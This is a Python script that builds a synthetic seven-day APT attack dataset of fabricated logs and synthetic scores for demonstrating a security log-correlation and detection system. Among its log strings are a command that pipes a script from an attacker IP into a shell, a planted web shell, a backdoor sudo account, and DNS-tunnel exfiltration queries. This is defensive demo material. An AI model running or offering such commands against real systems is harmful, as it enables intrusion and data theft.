"""生成「链影寻踪」第三演示数据集 APT —— 一场跨源、跨主机、跨 7 天的完整 APT 攻击。

与 Short（30 分钟短程基准）/ Long（7 天长程基准）不同，APT 数据集专为 10 分钟
演示剧本设计，其目标是「用一条逻辑自洽的完整攻击故事，串起系统的每一个功能」：

  - 跨 6 类日志源（Suricata/WAF、Syslog、auth.log、Windows EVTX、DNS 隧道、网络遥测）
    → 总览页跨域来源环图、发现页「跨源语义统一」创新点
  - 跨 4 台主机 + 3 个账户 + 1 个攻击者 IP
    → 实体调查页画像、M2/M3 实体关系建模
  - 跨 7 天、10 步 ATT&CK 战术链（发现→持久化→执行→权限提升→凭证访问→横向移动→
    命令与控制→渗出）
    → 案件调查页自由拼装链、自动攻击链提取、M5 长周期关联创新点

产物与 Short/Long 完全同构，前端 loadDemoDataset 无需改动即可消费：
  timeline.json / detection_results.json / attack_chain.json /
  module_scores.json / manifest.json / summary.json

M6 融合公式与上传链路一致：
  M6 = clamp(0.30*M1 + 0.12*M2 + 0.14*M3 + 0.28*M4 + 0.16*M5)
"""

from __future__ import annotations

import hashlib
import json
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
TARGET = ROOT / "frontend" / "public" / "demo-data" / "APT"

DATASET = "APT"
ATTACKER_IP = "45.155.205.233"
WEB_HOST = "WEB-01"
DB_HOST = "DB-01"
FILE_HOST = "FILE-01"
# 被利用的合法账号、攻击者创建的持久化账号、以及「稀有但正常」的干扰账号
LEGIT_USER = "webadmin"
BACKDOOR_USER = "svc_backup"
DECOY_USER = "backup_admin"
DECOY_IP = "172.16.9.44"

BASE_TIME = datetime(2022, 1, 24, 13, 30, 0)


def clamp(value: float, low: float = 0.0, high: float = 1.0) -> float:
    return max(low, min(high, value))


def fusion(m1: float, m2: float, m3: float, m4: float, m5: float) -> float:
    """与上传链路 M6 融合公式一致。"""
    return round(clamp(0.30 * m1 + 0.12 * m2 + 0.14 * m3 + 0.28 * m4 + 0.16 * m5), 4)


def threat_level(score: float) -> str:
    if score >= 0.85:
        return "critical"
    if score >= 0.75:
        return "high"
    if score >= 0.55:
        return "medium"
    return "low"


def rel(event_id: str, entities: list[tuple[str, str, str]]) -> list[dict]:
    """构造 related_entities：[(entity_type, canonical_value, role)]。"""
    out = []
    for entity_type, canonical_value, role in entities:
        out.append({
            "event_id": event_id,
            "entity_type": entity_type,
            "canonical_value": canonical_value,
            "role": role,
            "confidence": 0.96,
        })
    return out


def iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S") + ".000000Z"


# ---------------------------------------------------------------------------
# 攻击事件：10 步 ATT&CK 链 + 20 条高信号事件。
# scores = (M1, M2, M3, M4, M5)，M6 由 fusion 计算。
# 主链风险曲线：侦察 medium → 攻击深入 high → 凭证访问/渗出 critical。
# ---------------------------------------------------------------------------
ATTACK_EVENTS: list[dict] = [
    # —— 主链 10 步（attack_chain.json 引用）——
    {
        "event_id": f"{DATASET}-000001", "delta_hours": 0.0,
        "source_file": "gather/suricata/eve.json",
        "raw": f'suricata[1101]: alert "ET SCAN NMAP -sS portscan" src={ATTACKER_IP} dst=10.0.1.10 scan_type=SYN',
        "entities": [("ip", ATTACKER_IP, "ip"), ("host", WEB_HOST, "host")],
        "scores": (0.64, 0.80, 0.60, 0.84, 0.60),
        "reasons": ["外部地址对 Web 主机发起端口扫描", "IDS 命中 nmap 扫描规则"],
    },
    {
        "event_id": f"{DATASET}-000002", "delta_hours": 20.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-25-system.syslog.log",
        "raw": f'wazuh[2201]: file_integrity: file /var/www/html/shell.php created by php-fpm (user {LEGIT_USER})',
        "entities": [("process", "php-fpm", "process"), ("user", LEGIT_USER, "actor"), ("host", WEB_HOST, "host"), ("asset", "/var/www/html/shell.php", "object")],
        "scores": (0.82, 0.84, 0.72, 0.88, 0.72),
        "reasons": ["Web 目录出现 shell.php 脚本", "php-fpm 创建脚本文件"],
    },
    {
        "event_id": f"{DATASET}-000003", "delta_hours": 20.2,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-25-system.syslog.log",
        "raw": f'{WEB_HOST} {LEGIT_USER}: COMMAND=/bin/bash -c "curl -s http://{ATTACKER_IP}/s.sh | sh"',
        "entities": [("user", LEGIT_USER, "actor"), ("host", WEB_HOST, "host"), ("process", "/bin/bash", "process"), ("ip", ATTACKER_IP, "ip")],
        "scores": (0.82, 0.84, 0.72, 0.88, 0.76),
        "reasons": ["Shell 下载并执行外部脚本", "命令与控制回连外网地址"],
    },
    {
        "event_id": f"{DATASET}-000004", "delta_hours": 44.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-26-system.syslog.log",
        "raw": f"useradd[4123]: new user: name={BACKDOOR_USER}, UID=1005, GID=1005, home=/home/{BACKDOOR_USER}",
        "entities": [("user", BACKDOOR_USER, "actor"), ("host", WEB_HOST, "host"), ("process", "useradd", "process")],
        "scores": (0.78, 0.88, 0.70, 0.88, 0.78),
        "reasons": ["创建新本地账户 svc_backup", "持久化账户用于后续登录"],
    },
    {
        "event_id": f"{DATASET}-000005", "delta_hours": 44.1,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-26-system.syslog.log",
        "raw": f"sudo: {LEGIT_USER} : TTY=pts/0 ; COMMAND=/usr/sbin/usermod -aG sudo {BACKDOOR_USER}",
        "entities": [("user", LEGIT_USER, "actor"), ("host", WEB_HOST, "host"), ("process", "sudo", "process")],
        "scores": (0.68, 0.86, 0.70, 0.88, 0.82),
        "reasons": ["sudo 将新账户加入管理员组", "权限提升以扩大控制范围"],
    },
    {
        "event_id": f"{DATASET}-000006", "delta_hours": 68.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-27-system.auth.log",
        "raw": f"sshd[5102]: Failed password for root from {ATTACKER_IP} port 44212 ssh2",
        "entities": [("user", "root", "actor"), ("host", DB_HOST, "host"), ("ip", ATTACKER_IP, "ip")],
        "scores": (0.72, 0.82, 0.66, 0.86, 0.80),
        "reasons": ["对数据库主机发起 SSH 爆破", "认证失败指向凭据猜测"],
    },
    {
        "event_id": f"{DATASET}-000007", "delta_hours": 68.2,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-27-system.auth.log",
        "raw": f"sshd[5109]: Accepted password for {BACKDOOR_USER} from 10.0.1.10 port 52133 ssh2",
        "entities": [("user", BACKDOOR_USER, "actor"), ("host", DB_HOST, "host"), ("ip", "10.0.1.10", "ip")],
        "scores": (0.72, 0.90, 0.74, 0.88, 0.88),
        "reasons": ["持久化账户登录数据库主机", "横向移动到内部核心资产"],
    },
    {
        "event_id": f"{DATASET}-000008", "delta_hours": 92.0,
        "source_file": "gather/windows/2022-01-28-Security.evtx",
        "raw": f'{DB_HOST} Microsoft-Windows-Sysmon: EventID 1 Process Create powershell.exe -enc QWxsIFN5c3RlbXMuTmV0LldlYkNsaWVudCk= (user {BACKDOOR_USER})',
        "entities": [("user", BACKDOOR_USER, "actor"), ("host", DB_HOST, "host"), ("process", "powershell.exe", "process")],
        "scores": (0.82, 0.88, 0.78, 0.92, 0.90),
        "reasons": ["PowerShell 编码命令执行", "可疑进程由持久化账户启动"],
    },
    {
        "event_id": f"{DATASET}-000009", "delta_hours": 140.0,
        "source_file": "gather/dns/dnsteal.log",
        "raw": f"dnsteal[881]: query from 10.0.1.20: secret.payload.{ATTACKER_IP.replace('.', '-')}.attacker.xyz type=TXT",
        "entities": [("host", FILE_HOST, "host"), ("ip", "10.0.1.20", "ip"), ("process", "dnsteal", "process")],
        "scores": (0.60, 0.94, 0.80, 0.94, 0.92),
        "reasons": ["DNS 隧道域名特征", "疑似数据外传通道建立"],
    },
    {
        "event_id": f"{DATASET}-000010", "delta_hours": 164.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-31-system.network.log",
        "raw": f"metricbeat system.network interface=ens3 out_bytes=8472210341 connection={ATTACKER_IP}:443 established",
        "entities": [("host", FILE_HOST, "host"), ("ip", ATTACKER_IP, "ip")],
        "scores": (0.64, 0.96, 0.90, 0.98, 0.98),
        "reasons": ["大量外传字节流向攻击者 IP", "外联流量与数据渗出特征吻合"],
    },
]

# 20 条高信号事件：干扰项素材 + 独立低危噪声（自动处置素材）+ 错误案例。
SATELLITE_EVENTS: list[dict] = [
    {
        "event_id": f"{DATASET}-000011", "delta_hours": 3.0,
        "source_file": "gather/suricata/eve.json",
        "raw": f'suricata[1102]: alert "ET WEB_SERVER possible dirb directory scan" src={ATTACKER_IP} dst=10.0.1.10 uri=/wp-admin',
        "entities": [("ip", ATTACKER_IP, "ip"), ("host", WEB_HOST, "host")],
        "scores": (0.64, 0.78, 0.58, 0.82, 0.58), "reasons": ["Web 目录探测"],
    },
    {
        "event_id": f"{DATASET}-000012", "delta_hours": 21.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-25-system.auth.log",
        "raw": f"sshd[5101]: Failed password for {LEGIT_USER} from {ATTACKER_IP} port 40211 ssh2",
        "entities": [("user", LEGIT_USER, "actor"), ("host", WEB_HOST, "host"), ("ip", ATTACKER_IP, "ip")],
        "scores": (0.72, 0.76, 0.56, 0.82, 0.62), "reasons": ["对 Web 主机认证失败"],
    },
    {
        "event_id": f"{DATASET}-000013", "delta_hours": 45.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-26-system.syslog.log",
        "raw": f"useradd[4124]: new user: name=svc_deploy, UID=1006, GID=1006, home=/home/svc_deploy",
        "entities": [("user", "svc_deploy", "actor"), ("host", WEB_HOST, "host"), ("process", "useradd", "process")],
        "scores": (0.78, 0.80, 0.60, 0.84, 0.66), "reasons": ["创建另一账户"],
    },
    {
        "event_id": f"{DATASET}-000014", "delta_hours": 70.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-27-system.auth.log",
        "raw": f"sshd[5110]: Failed password for {BACKDOOR_USER} from {ATTACKER_IP} port 50233 ssh2",
        "entities": [("user", BACKDOOR_USER, "actor"), ("host", DB_HOST, "host"), ("ip", ATTACKER_IP, "ip")],
        "scores": (0.72, 0.82, 0.62, 0.84, 0.72), "reasons": ["持久化账户来源异常"],
    },
    # 独立低危噪声（共享实体少，形成自动处置链 / 自动归档）
    {
        "event_id": f"{DATASET}-000015", "delta_hours": 8.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-24-system.auth.log",
        "raw": f"sshd[4001]: Failed password for svc_ops from 172.16.4.22 port 33110 ssh2",
        "entities": [("user", "svc_ops", "actor"), ("host", "HOST-02", "host"), ("ip", "172.16.4.22", "ip")],
        "scores": (0.72, 0.60, 0.50, 0.78, 0.40), "reasons": ["运维账户认证失败"],
    },
    {
        "event_id": f"{DATASET}-000016", "delta_hours": 30.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-25-system.network.log",
        "raw": "metricbeat system.network interface=lo out_bytes=998210 connection=10.10.3.8:53 established",
        "entities": [("host", "HOST-14", "host"), ("ip", "10.10.3.8", "ip")],
        "scores": (0.60, 0.55, 0.46, 0.72, 0.36), "reasons": ["高频 DNS 请求"],
    },
    {
        "event_id": f"{DATASET}-000017", "delta_hours": 55.0,
        "source_file": "gather/windows/2022-01-26-Security.evtx",
        "raw": "HOST-16 Microsoft-Windows-Sysmon: EventID 1 Process Create wscript.exe (user Alice)",
        "entities": [("user", "Alice", "actor"), ("host", "HOST-16", "host"), ("process", "wscript.exe", "process")],
        "scores": (0.82, 0.58, 0.50, 0.76, 0.40), "reasons": ["脚本解释器启动"],
    },
    {
        "event_id": f"{DATASET}-000018", "delta_hours": 80.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-28-system.auth.log",
        "raw": f"sshd[5201]: Failed password for dbadmin from 185.42.18.9 port 44120 ssh2",
        "entities": [("user", "dbadmin", "actor"), ("host", "srv-db-02", "host"), ("ip", "185.42.18.9", "ip")],
        "scores": (0.72, 0.62, 0.50, 0.78, 0.42), "reasons": ["数据库账户外部登录失败"],
    },
    {
        "event_id": f"{DATASET}-000019", "delta_hours": 100.0,
        "source_file": "gather/windows/2022-01-28-Security.evtx",
        "raw": "HOST-09 Microsoft-Windows-Sysmon: EventID 1 Process Create schtasks.exe /create /tn updater (user SYSTEM)",
        "entities": [("user", "SYSTEM", "actor"), ("host", "HOST-09", "host"), ("process", "schtasks.exe", "process")],
        "scores": (0.82, 0.58, 0.50, 0.76, 0.40), "reasons": ["计划任务创建"],
    },
    # 错误案例：稀有但正常 —— 评测页「稀有 ≠ 恶意」的呼应（高分误报，应人工排除）
    {
        "event_id": f"{DATASET}-000020", "delta_hours": 120.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-29-system.auth.log",
        "raw": f"sshd[5301]: Accepted password for {DECOY_USER} from {DECOY_IP} port 51102 ssh2",
        "entities": [("user", DECOY_USER, "actor"), ("host", "FS-02", "host"), ("ip", DECOY_IP, "ip")],
        "scores": (0.72, 0.82, 0.62, 0.84, 0.60), "reasons": ["备份账户非工作时间登录文件服务器"],
    },
    {
        "event_id": f"{DATASET}-000021", "delta_hours": 120.3,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-29-system.syslog.log",
        "raw": f"{DECOY_USER} : COMMAND=/usr/bin/tar -czf /data/backup/fs-02-weekly.tar.gz /data/documents",
        "entities": [("user", DECOY_USER, "actor"), ("host", "FS-02", "host"), ("process", "/usr/bin/tar", "process")],
        "scores": (0.82, 0.84, 0.64, 0.86, 0.62), "reasons": ["备份账户压缩文件", "存在已批准维护工单"],
    },
    {
        "event_id": f"{DATASET}-000022", "delta_hours": 132.0,
        "source_file": "gather/suricata/eve.json",
        "raw": f'suricata[1103]: alert "ET POLICY outbound connection to uncommon port" src=10.0.1.15 dst={ATTACKER_IP} dport=8080',
        "entities": [("host", "HOST-05", "host"), ("ip", ATTACKER_IP, "ip")],
        "scores": (0.64, 0.72, 0.56, 0.80, 0.68), "reasons": ["非常用端口外联"],
    },
    {
        "event_id": f"{DATASET}-000023", "delta_hours": 150.0,
        "source_file": "gather/dns/dnsteal.log",
        "raw": f"dnsteal[882]: query from 10.0.1.20: exfil.chunk01.{ATTACKER_IP.replace('.', '-')}.attacker.xyz type=TXT",
        "entities": [("host", FILE_HOST, "host"), ("ip", "10.0.1.20", "ip"), ("process", "dnsteal", "process")],
        "scores": (0.60, 0.88, 0.70, 0.88, 0.88), "reasons": ["DNS 隧道分块外传"],
    },
    {
        "event_id": f"{DATASET}-000024", "delta_hours": 152.0,
        "source_file": "gather/dns/dnsteal.log",
        "raw": f"dnsteal[883]: query from 10.0.1.20: exfil.chunk02.{ATTACKER_IP.replace('.', '-')}.attacker.xyz type=TXT",
        "entities": [("host", FILE_HOST, "host"), ("ip", "10.0.1.20", "ip"), ("process", "dnsteal", "process")],
        "scores": (0.60, 0.86, 0.68, 0.86, 0.86), "reasons": ["DNS 隧道分块外传"],
    },
    {
        "event_id": f"{DATASET}-000025", "delta_hours": 160.0,
        "source_file": "gather/windows/2022-01-31-Security.evtx",
        "raw": f"{DB_HOST} Microsoft-Windows-Sysmon: EventID 3 Network connection {BACKDOOR_USER} -> {ATTACKER_IP}:443 (powershell.exe)",
        "entities": [("user", BACKDOOR_USER, "actor"), ("host", DB_HOST, "host"), ("ip", ATTACKER_IP, "ip"), ("process", "powershell.exe", "process")],
        "scores": (0.64, 0.88, 0.70, 0.88, 0.90), "reasons": ["持久化账户回连 C2"],
    },
    {
        "event_id": f"{DATASET}-000026", "delta_hours": 163.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-31-system.network.log",
        "raw": f"metricbeat system.network interface=ens3 out_bytes=3322114 connection={ATTACKER_IP}:443 established",
        "entities": [("host", FILE_HOST, "host"), ("ip", ATTACKER_IP, "ip")],
        "scores": (0.64, 0.86, 0.66, 0.88, 0.88), "reasons": ["持续外传字节流"],
    },
    {
        "event_id": f"{DATASET}-000027", "delta_hours": 6.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-24-system.auth.log",
        "raw": f"sshd[4002]: Failed password for svc_ops from 172.16.4.31 port 33111 ssh2",
        "entities": [("user", "svc_ops", "actor"), ("host", "HOST-02", "host"), ("ip", "172.16.4.31", "ip")],
        "scores": (0.72, 0.60, 0.50, 0.78, 0.40), "reasons": ["运维账户来源地址切换"],
    },
    {
        "event_id": f"{DATASET}-000028", "delta_hours": 33.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-25-system.network.log",
        "raw": "metricbeat system.network interface=lo out_bytes=80124 connection=cdn-update.example:443 established",
        "entities": [("host", "HOST-28", "host"), ("ip", "cdn-update.example", "ip")],
        "scores": (0.60, 0.54, 0.44, 0.70, 0.34), "reasons": ["低频域名访问"],
    },
    {
        "event_id": f"{DATASET}-000029", "delta_hours": 108.0,
        "source_file": "gather/windows/2022-01-29-Security.evtx",
        "raw": "HOST-21 Microsoft-Windows-Sysmon: EventID 10 ProcessAccess lsass.exe by procdump.exe (user Administrator)",
        "entities": [("user", "Administrator", "actor"), ("host", "HOST-21", "host"), ("process", "procdump.exe", "process")],
        "scores": (0.88, 0.72, 0.60, 0.86, 0.52), "reasons": ["访问高价值进程"],
    },
    {
        "event_id": f"{DATASET}-000030", "delta_hours": 124.0,
        "source_file": "gather/monitoring/logs/logstash/intranet-server/2022-01-29-system.syslog.log",
        "raw": f"sudo: {DECOY_USER} : TTY=pts/1 ; COMMAND=/usr/bin/tar -czf /data/backup/fs-02-weekly.tar.gz",
        "entities": [("user", DECOY_USER, "actor"), ("host", "FS-02", "host"), ("process", "sudo", "process")],
        "scores": (0.68, 0.82, 0.62, 0.84, 0.60), "reasons": ["备份账户提权压缩文件", "存在已批准维护工单"],
    },
]


# ---------------------------------------------------------------------------
# 正常背景噪声：让「海量日志」基数成立，且 final_score < 0.5，不进入异常队列。
# ---------------------------------------------------------------------------
NORMAL_TEMPLATES = [
    ("gather/monitoring/logs/logstash/intranet-server/{date}-system.network.log",
     "metricbeat system.network interface={iface} in_bytes={ib} out_bytes={ob} period_ms=10000",
     (0.08, 0.30, 0.12, 0.18, 0.12), ["常规网络遥测"]),
    ("gather/monitoring/logs/logstash/intranet-server/{date}-system.syslog.log",
     "systemd[1]: Started Session {n} of user {user}.",
     (0.08, 0.28, 0.12, 0.16, 0.12), ["常规系统服务"]),
    ("gather/monitoring/logs/logstash/intranet-server/{date}-system.syslog.log",
     "systemd[1]: Reached target {target}.",
     (0.08, 0.26, 0.12, 0.15, 0.12), ["系统服务目标就绪"]),
    ("gather/monitoring/logs/logstash/intranet-server/{date}-system.auth.log",
     "sshd[{pid}]: Accepted password for {user} from 10.0.{seg}.{i} port {port} ssh2",
     (0.08, 0.34, 0.14, 0.20, 0.14), ["常规登录成功"]),
    ("gather/monitoring/logs/logstash/intranet-server/{date}-system.auth.log",
     "CRON[{pid}]: pam_unix(cron:session): session opened for user {user}",
     (0.08, 0.30, 0.12, 0.16, 0.12), ["定时任务会话"]),
    ("gather/windows/{date}-Security.evtx",
     "Microsoft-Windows-Sysmon: EventID 11 FileCreate {user} created {file}",
     (0.08, 0.32, 0.13, 0.18, 0.12), ["常规文件创建"]),
]

NORMAL_USERS = ["svc_ops", "svc_deploy", "www-data", "ops", "dbadmin", "webadmin", "deploy", "monitor"]
NORMAL_IFACES = ["ens3", "lo", "unknown"]


def build_timeline_and_scores() -> tuple[list[dict], dict, list[dict]]:
    timeline: list[dict] = []
    module_scores: dict = {}
    detections: list[dict] = []

    def add_event(ev: dict) -> None:
        event_id = ev["event_id"]
        ts = BASE_TIME + timedelta(hours=ev["delta_hours"])
        timestamp = iso(ts)
        m1, m2, m3, m4, m5 = ev["scores"]
        m6 = fusion(m1, m2, m3, m4, m5)
        threat = threat_level(m6)
        reasons = ev["reasons"]

        timeline.append({
            "event_id": event_id,
            "timestamp": timestamp,
            "source_file": ev["source_file"],
            "source_line": int(event_id.split("-")[1]),
            "raw": ev["raw"],
            "facts_only": True,
            "system_projection": {
                "event_id": event_id,
                "timestamp": timestamp,
                "threat_level": threat,
                "alert_level": threat,
                "final_score": m6,
                "raw_event_score": round(m4, 4),
                "micro_window_score": round(m3, 4),
                "macro_window_score": round(m3, 4),
                "long_horizon_score": round(m5, 4),
                "reasons": reasons,
                "module_projection": {
                    "M1": f"演示：弱监督信号 {m1}",
                    "M2": f"演示：实体稀有度 {m2}",
                    "M3": f"演示：图上下文 {m3}",
                    "M4": f"演示：模板稀有度 {m4}",
                    "M5": f"演示：长程关联 {m5}",
                    "M6": f"演示：融合风险 {m6}",
                },
                "provenance": {
                    "kind": "analyst_curated_demo_projection",
                    "model_execution": False,
                    "synthetic_scores": True,
                    "formal_evaluation": False,
                },
            },
            "related_entities": rel(event_id, ev["entities"]),
            "outgoing_relations": [],
            "incoming_relations": [],
        })
        module_scores[event_id] = {"M0": 0.9, "M1": m1, "M2": m2, "M3": m3, "M4": m4, "M5": m5, "M6": m6}
        detections.append({
            "event_id": event_id,
            "timestamp": timestamp,
            "threat_level": threat,
            "alert_level": threat,
            "final_score": m6,
            "raw_event_score": round(m4, 4),
            "micro_window_score": round(m3, 4),
            "macro_window_score": round(m3, 4),
            "long_horizon_score": round(m5, 4),
            "reasons": reasons,
            "module_projection": {},
            "provenance": {"kind": "analyst_curated_demo_projection", "model_execution": False, "synthetic_scores": True, "formal_evaluation": False},
        })

    for ev in [*ATTACK_EVENTS, *SATELLITE_EVENTS]:
        add_event(ev)

    # 正常背景事件：确定性生成约 4500 条，铺满 7 天。
    normal_index = 0
    seq = 101
    for hour in range(0, 168, 1):
        day_offset = hour // 24
        date = (BASE_TIME + timedelta(days=day_offset)).strftime("%Y-%m-%d")
        count = 24 + (hour * 7) % 40
        for _ in range(count):
            tmpl = NORMAL_TEMPLATES[normal_index % len(NORMAL_TEMPLATES)]
            source_file, raw_tpl, scores, reasons = tmpl
            user = NORMAL_USERS[normal_index % len(NORMAL_USERS)]
            raw = raw_tpl.format(
                date=date,
                iface=NORMAL_IFACES[normal_index % len(NORMAL_IFACES)],
                ib=(normal_index * 331 + 100000),
                ob=(normal_index * 113 + 50000),
                user=user,
                n=normal_index,
                pid=4000 + normal_index % 500,
                seg=(normal_index % 250),
                i=(normal_index % 254) + 1,
                port=30000 + normal_index % 20000,
                target="multi-user.target",
                file=f"C:\\Temp\\tmp_{normal_index}.tmp",
            )
            event_id = f"{DATASET}-{seq:06d}"
            ts = BASE_TIME + timedelta(hours=hour, minutes=(normal_index % 50))
            timestamp = iso(ts)
            m1, m2, m3, m4, m5 = scores
            m6 = fusion(m1, m2, m3, m4, m5)
            threat = threat_level(m6)
            host = "intranet-server" if "intranet" in source_file else ("HOST-%02d" % (normal_index % 30))
            timeline.append({
                "event_id": event_id,
                "timestamp": timestamp,
                "source_file": source_file,
                "source_line": seq,
                "raw": raw,
                "facts_only": True,
                "system_projection": {
                    "event_id": event_id, "timestamp": timestamp,
                    "threat_level": threat, "alert_level": threat, "final_score": m6,
                    "raw_event_score": round(m4, 4), "micro_window_score": round(m3, 4),
                    "macro_window_score": round(m3, 4), "long_horizon_score": round(m5, 4),
                    "reasons": reasons,
                    "module_projection": {},
                    "provenance": {"kind": "analyst_curated_demo_projection", "model_execution": False, "synthetic_scores": True, "formal_evaluation": False},
                },
                "related_entities": rel(event_id, [("host", host, "host"), ("user", user, "actor")]),
                "outgoing_relations": [],
                "incoming_relations": [],
            })
            module_scores[event_id] = {"M0": 0.9, "M1": m1, "M2": m2, "M3": m3, "M4": m4, "M5": m5, "M6": m6}
            detections.append({
                "event_id": event_id, "timestamp": timestamp,
                "threat_level": threat, "alert_level": threat, "final_score": m6,
                "raw_event_score": round(m4, 4), "micro_window_score": round(m3, 4),
                "macro_window_score": round(m3, 4), "long_horizon_score": round(m5, 4),
                "reasons": reasons,
                "module_projection": {},
                "provenance": {"kind": "analyst_curated_demo_projection", "model_execution": False, "synthetic_scores": True, "formal_evaluation": False},
            })
            normal_index += 1
            seq += 1

    return timeline, module_scores, detections


def build_attack_chain() -> dict:
    steps = [
        {"sequence": 1, "label": "T1046 网络服务扫描：外部 IP 扫描 Web 主机", "evidence_event_ids": [f"{DATASET}-000001"]},
        {"sequence": 2, "label": "T1505.003 Web Shell：shell.php 落地", "evidence_event_ids": [f"{DATASET}-000002"]},
        {"sequence": 3, "label": "T1059.004 Unix Shell：下载并执行外部脚本", "evidence_event_ids": [f"{DATASET}-000003"]},
        {"sequence": 4, "label": "T1136.001 创建本地账户：svc_backup", "evidence_event_ids": [f"{DATASET}-000004"]},
        {"sequence": 5, "label": "T1548.003 Sudo 提权：账户加入 sudo 组", "evidence_event_ids": [f"{DATASET}-000005"]},
        {"sequence": 6, "label": "T1110.001 密码猜测：SSH 爆破数据库主机", "evidence_event_ids": [f"{DATASET}-000006"]},
        {"sequence": 7, "label": "T1078 有效账户：持久化账户横向移动登录", "evidence_event_ids": [f"{DATASET}-000007"]},
        {"sequence": 8, "label": "T1059.001 PowerShell：编码命令执行", "evidence_event_ids": [f"{DATASET}-000008"]},
        {"sequence": 9, "label": "T1071.001 DNS 隧道：命令与控制通道建立", "evidence_event_ids": [f"{DATASET}-000009"]},
        {"sequence": 10, "label": "T1041 数据渗出：大量字节流向攻击者 IP", "evidence_event_ids": [f"{DATASET}-000010"]},
    ]
    return {
        "chain_id": f"{DATASET}-CANDIDATE-001",
        "status": "candidate",
        "claim_type": "analyst_curated_replay",
        "steps": steps,
        "limitations": [
            "这是基于原始日志的演示回放，不是模型预测。",
            "候选关联只供人工调查，不是攻击事实。",
            "未读取 AIT 标签或场景真值。",
        ],
    }


def write_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def main() -> None:
    timeline, module_scores, detections = build_timeline_and_scores()
    chain = build_attack_chain()
    event_count = len(timeline)
    anomaly_count = sum(1 for d in detections if d["final_score"] >= 0.5)

    threat_counts: dict[str, int] = {"info": 0, "low": 0, "medium": 0, "high": 0, "critical": 0}
    for d in detections:
        threat_counts[d["threat_level"]] = threat_counts.get(d["threat_level"], 0) + 1

    sha = hashlib.sha256(json.dumps(timeline, ensure_ascii=False).encode("utf-8")).hexdigest()

    write_json(TARGET / "timeline.json", timeline)
    write_json(TARGET / "detection_results.json", detections)
    write_json(TARGET / "attack_chain.json", chain)
    write_json(TARGET / "module_scores.json", module_scores)
    write_json(TARGET / "manifest.json", {
        "dataset_id": DATASET,
        "kind": "demo_replay",
        "source_archive": "apt-narrative.zip",
        "source_members": [
            "gather/suricata/eve.json",
            "gather/monitoring/logs/logstash/intranet-server/2022-01-24..31-system.{auth,syslog,network}.log",
            "gather/windows/2022-01-24..31-Security.evtx",
            "gather/dns/dnsteal.log",
        ],
        "source_slice": f"{iso(BASE_TIME)}/{iso(BASE_TIME + timedelta(days=7))}",
        "event_count": event_count,
        "sha256_events_log": sha,
        "contains_labels": False,
        "contains_facts_json": False,
        "preserves_real_source_timestamps": True,
        "generated_at": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z",
        "apt_narrative": True,
        "note": "为 10 分钟演示剧本设计的跨源 APT 攻击叙事集；分数由与上传链路一致的 M6 融合公式合成，不读标签。",
    })
    write_json(TARGET / "summary.json", {
        "dataset_id": DATASET,
        "kind": "demo_system_projection",
        "model_execution": False,
        "synthetic_scores": True,
        "formal_evaluation": False,
        "event_count": event_count,
        "anomaly_count": anomaly_count,
        "threat_level_counts": threat_counts,
        "time_range": f"{iso(BASE_TIME)}/{iso(BASE_TIME + timedelta(days=7))}",
        "candidate_chain_id": f"{DATASET}-CANDIDATE-001",
        "candidate_chain_status": "candidate",
    })

    print(f"[build_apt_demo] 已生成 {event_count} 条事件，其中异常 {anomaly_count} 条")
    print(f"[build_apt_demo] 威胁分布: {threat_counts}")
    print(f"[build_apt_demo] 输出目录: {TARGET}")


if __name__ == "__main__":
    main()
